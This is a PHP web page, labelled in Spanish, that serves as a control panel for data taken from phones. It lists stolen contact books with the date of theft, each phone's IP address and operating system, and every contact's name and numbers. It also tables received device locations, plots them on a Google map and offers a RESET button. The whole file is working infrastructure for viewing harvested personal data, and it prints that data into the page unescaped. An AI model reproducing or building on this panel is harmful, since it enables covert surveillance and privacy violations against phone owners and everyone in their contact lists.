<?php error_reporting(0);
include 'contacts_repo.php';
include 'locations_repo.php';

$contacts_repo = ContactsRepository::getInstance();
$locations_repo = LocationsRepository::getInstance();
?>
<html>
  <head>
    <meta http-equiv="refresh" content="20">
    <!-- Latest compiled and minified CSS -->
    <link rel="stylesheet" href="css/bootstrap.min.css">

    <!-- Optional theme -->
    <link rel="stylesheet" href="css/bootstrap-theme.min.css">

    <!-- Latest compiled and minified JavaScript -->
    <script src="js/jquery-2.1.4.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="https://maps.googleapis.com/maps/api/js?v=3.exp&sensor=false"></script>

              <style>
                  html, body, #map-canvas {
  height: 100%;
  margin: 0;
  padding: 0;
}
              </style>
  </head>
<body>  
  <div class="container" style="width:100%; height:95%">
    <div id="contacts-panel" class="panel panel-primary col-md-5">
      <!-- Default panel contents -->
      <div class="panel-heading"><h1>Contactos robados (<?php echo $contacts_repo->getTotalCount(); ?>)</h1></div>
      <div class="panel-body" style="overflow: scroll; height: 80%;">
        <?php foreach($contacts_repo->getPhoneBooks() as $phone_book): ?>
        <div class="row" style="border-top:solid "> 
          <div class="col-md-3"><b>Fecha de robo</b><br><?php echo $phone_book->getRetrievedDate()->format('Y-m-d H:i:s'); ?></div>
          <div class="col-md-3"><b>IP del celular</b><br><?php echo $phone_book->getRemoteAddr(); ?></div>
          <div class="col-md-6"><b>Sistema operativo</b><br><?php echo $phone_book->getUserAgent(); ?></div>
        </div>
        <div class="row">
          <table class="table table-condensed table-bordered"> 
            <thead><tr><th>ID</th><th>Nombre</th><th>Telefonos</th></tr></thead>
            <tbody>
              <?php foreach($phone_book->getContacts() as $contact): ?>
              <tr>
                <td><?php echo $contact->getID(); ?></td>
                <td><?php echo $contact->getName(); ?></td>
                <td>
                    <ul class="list-group">
                    <?php 
                foreach ($contact->getPhonesStringified() as $contact){?>
                        <li class="list-group-item"><span class="glyphicon glyphicon-earphone"></span><?php echo $contact?></li>
                <?php }
                ?>
                    </ul></td>
              </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </div>
        <?php endforeach; ?>
      </div>
    </div>  
    <div id="locations-panel" class="panel panel-primary col-md-7">
      <!-- Default panel contents -->
      <div class="panel-heading"><h1>Ubicaciones recibidas (<?php echo $locations_repo->getTotalCount(); ?>)</h1></div>
      <div class="panel-body" style="overflow: scroll; height: 80%;">
         <div class="row">
          <table class="table table-condensed table-bordered"> 
            <thead><tr><th>Fecha de robo</th><th>IP del celular</th><th>Ubicacion</th></tr></thead>
            <tbody>
              <?php foreach($locations_repo->getLocations() as $location): ?>
                <tr>
                  <td><?php echo $location->getRetrievedDate()->format('Y-m-d H:i:s'); ?></td>
                  <td><?php echo $location->getRemoteAddr(); ?></td>
                  <td><?php echo $location->getLocation(); ?></td>
                </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </div>
     </div>
      <div>
          <div id="map-canvas"></div>
         <script type="text/javascript">
              var map;

// The JSON data
var json = [
 <?php 
 $id = 0;
 foreach($locations_repo->getLocations() as $location): 
                echo '{"id":'.$id.',"title": "'.$location->getRemoteAddr().' / '.$location->getRetrievedDate()->format('Y-m-d H:i:s').'", "longitude":"'.split(",",$location->getLocation())[0].'", "latitude":"'.split(",",$location->getLocation())[1].'"},';
 $id++;
               endforeach; ?>
                   ]
                  
//var json = [{"id":48,"title":"Helgelandskysten","longitude":"12.63376","latitude":"66.02219"},{"id":46,"title":"Tysfjord","longitude":"16.50279","latitude":"68.03515"},{"id":44,"title":"Sledehunds-ekspedisjon","longitude":"7.53744","latitude":"60.08929"},{"id":43,"title":"Amundsens sydpolferd","longitude":"11.38411","latitude":"62.57481"},{"id":39,"title":"Vikingtokt","longitude":"6.96781","latitude":"60.96335"},{"id":6,"title":"Tungtvann- sabotasjen","longitude":"8.49139","latitude":"59.87111"}];



function initialize() {
  
  // Giving the map som options
  var mapOptions = {
    zoom: 4,
    center: new google.maps.LatLng(-34.542451, -58.441518)
  };
  
  // Creating the map
  map = new google.maps.Map(document.getElementById('map-canvas'), mapOptions);
  
  
  // Looping through all the entries from the JSON data
  for(var i = 0; i < json.length; i++) {
    
    // Current object
    var obj = json[i];

    // Adding a new marker for the object
    var marker = new google.maps.Marker({
      position: new google.maps.LatLng(obj.latitude,obj.longitude),
      map: map,
      title: obj.title // this works, giving the marker a title with the correct title
    });
    
    // Adding a new info window for the object
    var clicker = addClicker(marker, obj.title);
    
 



  } // end loop
  
  
  // Adding a new click event listener for the object
  function addClicker(marker, content) {
    google.maps.event.addListener(marker, 'click', function() {
      
      if (infowindow) {infowindow.close();}
      infowindow = new google.maps.InfoWindow({content: content});
      infowindow.open(map, marker);
      
    });
  }


  

  
  
 
  
  
  
}

// Initialize the map
google.maps.event.addDomListener(window, 'load', initialize);
              </script> 
      </div>
  </div>
 <div class="container">
  <a class="btn btn-danger" href="./reset.php" role="button">RESET</a>
 </div>
</body>
</html>